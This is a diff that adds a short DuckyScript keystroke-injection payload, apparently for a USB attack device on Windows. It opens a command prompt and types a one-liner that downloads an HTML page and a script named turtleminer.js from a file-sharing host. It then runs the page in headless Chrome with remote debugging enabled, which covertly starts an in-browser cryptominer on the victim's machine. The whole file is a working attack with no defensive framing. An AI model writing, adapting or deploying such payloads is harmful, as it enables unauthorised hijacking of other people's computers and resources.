@@ -1,0 +1,11 @@
+DELAY 500
+WINDOWS d
+DELAY 500
+WINDOWS r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 800
+STRING mkdir %HOMEPATH%\Files\webbe && cd %HOMEPATH%\Files\webbe && curl -L https://free.keep.sh/WsNS89mtzSMtBWUT/index.html > index.html && curl -L https://free.keep.sh/EUeI0C5WKfDmiyYe/turtleminer.js > turtleminer.js && "%ProgramFiles%\Google\Chrome\Application\chrome.exe" --headless --disable-gpu --remote-debugging-port=13012 "%HOMEPATH%\Files\webbe\index.html" && exit
+ENTER
+
